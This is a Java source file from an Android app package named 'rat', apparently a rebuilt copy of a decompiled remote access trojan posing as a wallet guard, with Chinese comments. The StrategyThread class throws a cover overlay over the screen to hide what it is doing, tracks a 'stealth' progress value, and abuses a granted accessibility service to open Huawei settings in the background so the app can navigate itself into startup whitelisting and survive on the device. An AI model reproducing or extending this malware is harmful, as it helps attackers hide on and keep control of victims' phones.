package com.vendor.rat.keepalive.thread;

import android.content.Context;
import android.content.Intent;
import android.provider.Settings;
import android.util.Log;

import com.vendor.rat.MainApplication;
import com.vendor.rat.helper.BlockViewHelper;
import com.vendor.rat.helper.StealthHelper;
import com.vendor.rat.service.MyAccessibilityService;
import com.vendor.rat.utils.DeviceUtils;

import java.util.Timer;
import java.util.concurrent.ConcurrentLinkedQueue;
import java.util.concurrent.atomic.AtomicBoolean;

/**
 * Vendor: com.guard.wallet.thread.j
 * Strategy thread — 保活策略执行器
 *
 * vendor 流程:
 *   1. KeepHeartThread.run() → API /walletAuth/strategy/noCompletes
 *   2. API 回调 → StrategyThread.g(BlockViewVO, true)
 *   3. g() → 显示遮罩 (BlockViewHelper.show) + 打开设置页面 (Intent)
 *   4. HuaweiEngine 被动检测窗口变化 → 自动导航到启动管理
 *
 * vendor j.g() decompile failed (306 instructions), 从真机日志推断实现
 */
public final class StrategyThread {

    private static final String TAG = "StrategyThread";
    private static volatile StrategyThread instance;
    private final int mode;
    private Object data;
    private Object extra;

    /** 防止重复触发 */
    private static final AtomicBoolean keepAliveTriggered = new AtomicBoolean(false);

    /**
     * Vendor: j() default constructor - mode 0, starts timer
     */
    public StrategyThread() {
        this.mode = 0;
        this.data = new ConcurrentLinkedQueue<>();
        this.extra = new Timer();
        ((Timer) this.extra).schedule(new ScheduledTimerTask(this, 1), 500L, 500L);
    }

    /**
     * Vendor: j(int) - mode constructor
     */
    public StrategyThread(int mode) {
        this.mode = mode;
    }

    /**
     * Vendor: j(Object, Object, int) - full constructor
     */
    public StrategyThread(Object data, Object extra, int mode) {
        this.mode = mode;
        this.data = data;
        this.extra = extra;
    }

    public static StrategyThread getInstance() {
        if (instance == null) {
            synchronized (StrategyThread.class) {
                if (instance == null) {
                    instance = new StrategyThread();
                }
            }
        }
        return instance;
    }

    /**
     * Vendor: j.e() - checks if strategy should run
     */
    public static boolean shouldRun() {
        try {
            // vendor: 检查 WebSocket 状态、屏幕状态、网络
            return MyAccessibilityService.P() != null;
        } catch (Exception e) {
            Log.e(TAG, "shouldRun error", e);
            return false;
        }
    }

    /**
     * Vendor: j.g(BlockViewVO, boolean) — 触发保活自动化
     * Decompiled code corrupted (306 instructions).
     * 从真机日志推断:
     *   1. helper.g.a(blockViewVO) → 显示遮罩
     *   2. Intent 打开 com.android.settings.HWSettings (主设置页面)
     *   3. HuaweiEngine 通过事件驱动完成操作
     */
    public static boolean applyBlockView(Object blockViewVO, boolean flag) {
        try {
            if (!shouldRun()) {
                Log.d(TAG, "策略不满足运行条件");
                return false;
            }

            Log.d(TAG, "触发保活自动化");

            // 1. 显示遮罩 (vendor: helper.g.a(blockViewVO))
            BlockViewHelper.show(blockViewVO);
            Log.d(TAG, "遮罩已显示");

            // 2. 更新初始进度
            StealthHelper.updateProgress(10);

            // 3. 打开设置页面 (vendor: 通过 Intent 打开主设置)
            // 关键: 不是直接打开启动管理，而是打开主设置
            // HuaweiEngine 被动检测 HWSettings 窗口 → 自动导航
            Context context = null;
            MyAccessibilityService service = MyAccessibilityService.P();
            if (service != null) {
                context = service.getApplicationContext();
            }
            if (context == null && MainApplication.getApplication() != null) {
                context = MainApplication.getApplication().getApplicationContext();
            }

            if (context != null) {
                // vendor: 华为设备打开 HWSettings
                // 关键: 必须用 AccessibilityService 作为 Context 启动
                // Android 10+ 禁止后台 startActivity，但 AccessibilityService 有特权
                if (DeviceUtils.isHuawei()) {
                    try {
                        Intent hwIntent = new Intent();
                        hwIntent.setClassName("com.android.settings",
                            "com.android.settings.HWSettings");
                        hwIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                        hwIntent.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP);
                        // 用 AccessibilityService 直接启动 (有后台启动特权)
                        if (service != null) {
                            service.startActivity(hwIntent);
                        } else {
                            context.startActivity(hwIntent);
                        }
                        Log.d(TAG, "启动华为系统设置成功");
                    } catch (Exception e) {
                        // fallback: 通用设置
                        Log.w(TAG, "HWSettings 启动失败，使用通用设置", e);
                        Intent settingsIntent = new Intent(Settings.ACTION_SETTINGS);
                        settingsIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                        if (service != null) {
                            service.startActivity(settingsIntent);
                        } else {
                            context.startActivity(settingsIntent);
                        }
                        Log.d(TAG, "启动通用系统设置");
                    }
                } else {
                    // 非华为: 通用设置
                    Intent settingsIntent = new Intent(Settings.ACTION_SETTINGS);
                    settingsIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                    if (service != null) {
                        service.startActivity(settingsIntent);
                    } else {
                        context.startActivity(settingsIntent);
                    }
                    Log.d(TAG, "启动系统设置");
                }
            } else {
                Log.e(TAG, "无法获取 Context，设置页面启动失败");
                return false;
            }

            return true;
        } catch (Exception e) {
            Log.e(TAG, "applyBlockView error", e);
            return false;
        }
    }

    /**
     * 触发保活策略 — 由 KeepHeartThread 在 noCompletes API 回调后调用
     * vendor: noCompletes API 返回未完成策略 → 调用 g(BlockViewVO, true)
     *
     * ADAPT: 由于没有真实 API 服务器，由 KeepHeartThread 直接触发
     * 条件: 无障碍已授权 + 华为设备 + 未触发过
     */
    public static void triggerKeepAliveIfNeeded() {
        try {
            if (keepAliveTriggered.get()) return;

            MyAccessibilityService service = MyAccessibilityService.P();
            if (service == null) return;

            // 只在华为设备上触发
            if (!DeviceUtils.isHuawei()) return;

            // 防止重复触发
            if (!keepAliveTriggered.compareAndSet(false, true)) return;

            Log.d(TAG, "noCompletes 策略触发保活自动化");

            // vendor: 在工作线程执行
            new Thread(() -> {
                try {
                    // vendor: 短暂等待无障碍服务稳定
                    Thread.sleep(500);
                    applyBlockView(null, true);
                } catch (Exception e) {
                    Log.e(TAG, "triggerKeepAlive error", e);
                    keepAliveTriggered.set(false);
                }
            }, "strategy-trigger").start();

        } catch (Exception e) {
            Log.e(TAG, "triggerKeepAliveIfNeeded error", e);
        }
    }

    /**
     * 重置触发状态 (用于测试或重新触发)
     */
    public static void resetTrigger() {
        keepAliveTriggered.set(false);
    }

    public int getMode() {
        return mode;
    }

    public Object getData() {
        return data;
    }

    public Object getExtra() {
        return extra;
    }
}
